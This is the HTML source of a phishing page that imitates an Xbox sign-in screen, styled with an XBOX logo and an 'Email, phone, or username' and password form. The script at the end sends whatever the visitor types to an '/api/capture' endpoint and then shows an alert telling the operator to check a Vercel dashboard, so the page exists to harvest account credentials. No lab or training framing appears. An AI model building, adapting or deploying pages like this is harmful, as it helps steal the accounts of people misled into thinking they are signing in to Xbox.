<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Xbox</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0e0e10;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .login-container {
            width: 100%;
            max-width: 380px;
            padding: 40px 30px;
            background: rgba(30, 30, 34, 0.95);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        .xbox-logo {
            text-align: center;
            margin-bottom: 40px;
        }
        .xbox-logo span {
            font-size: 52px;
            font-weight: 900;
            color: #10b981;
            letter-spacing: -4px;
        }
        h2 {
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            color: #ffffff;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #a1a1aa;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #1f1f23;
            border: 1px solid #3f3f46;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #10b981;
            color: black;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.2s;
        }
        .btn:hover {
            background: #34d399;
            transform: translateY(-1px);
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 13px;
            color: #71717a;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="xbox-logo">
            <span>XBOX</span>
        </div>
        
        <h2>Sign in</h2>
        
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Email, phone, or username</label>
                <input type="text" id="username" required autocomplete="off">
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" required autocomplete="off">
            </div>
            <button type="submit" class="btn">Sign in</button>
        </form>

        <div class="footer">
            <p>Don't have an account? <span style="color:#10b981; cursor:pointer;">Create one</span></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
           
            const usernameVal = document.getElementById('username').value;
            const passwordVal = document.getElementById('password').value;
            
            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        user: usernameVal,
                        pass: passwordVal
                    })
                });
                if (response.ok) {
                    alert('Request logged. Check Vercel Dashboard!');
                    document.getElementById('loginForm').reset();
                } else {
                    alert('Error payload status: ' + response.status);
                }
            } catch (err) {
                console.error('Network execution failure:', err);
            }
        });
    </script>
</body>
</html>
